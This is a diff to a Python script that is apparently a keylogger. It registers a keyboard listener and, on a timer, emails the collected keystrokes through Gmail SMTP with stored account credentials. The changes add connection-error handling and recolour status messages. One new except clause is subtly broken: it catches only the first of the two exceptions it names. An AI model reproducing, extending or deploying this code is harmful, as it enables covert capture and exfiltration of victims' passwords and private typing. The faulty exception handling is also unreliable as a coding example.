@@ -8,6 +8,7 @@ from colorama import init, Fore, Style
 from pyfiglet import figlet_format
 from termcolor import cprint
 
+import socket
 import smtplib
 import signal
 import sys
@@ -78,9 +79,9 @@ def send():
     if len(msg)>0:
         try:
             server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg)
-            print("[ - ] " + str(datetime.now()) + ": Message Send!\n")
-        except smtplib.SMTPServerDisconnected:
-            print("[ "+ Fore.RED + "ERROR" + Style.RESET_ALL + " ] Connection unexpectedly closed...\n")
+            print("[" + Fore.GREEN + "INFO" + Style.RESET_ALL + "] " + str(datetime.now()) + ": Message Send!\n")
+        except smtplib.SMTPServerDisconnected or TimeoutError:
+            print("["+ Fore.RED + "ERROR" + Style.RESET_ALL + "] Connection unexpectedly closed...\n")
             exit()
     t1 = Timer(TIME, send)
     t1.daemon = True
@@ -89,12 +90,16 @@ def send():
  
 listener = Listener(on_press=on_press)
 listener.start()
- 
-server=smtplib.SMTP('smtp.gmail.com',587)
-server.starttls()
 
-try: server.login(EMAIL_ADDRESS, EMAIL_PASSWD), print(Fore.GREEN + "\nConnection ESTABLISHED\n" + Style.RESET_ALL)
-except smtplib.SMTPAuthenticationError: print(Fore.RED + "\nConnection REFUSED" + Style.RESET_ALL + " (Check credentials or the references)\n"), exit()
+try:
+    server=smtplib.SMTP('smtp.gmail.com',587)
+    server.starttls()
+except socket.gaierror: 
+    print(Fore.LIGHTRED_EX + "\nNo internet connection...\n" + Style.RESET_ALL), exit()
+
+
+try: server.login(EMAIL_ADDRESS, EMAIL_PASSWD), print(Fore.LIGHTGREEN_EX + "\nConnection ESTABLISHED\n" + Style.RESET_ALL)
+except smtplib.SMTPAuthenticationError: print(Fore.LIGHTRED_EX + "\nConnection REFUSED" + Style.RESET_ALL + " (Check credentials or the references)\n"), exit()
 
 main_timer = Timer(5.0, send)
 main_timer.daemon = True
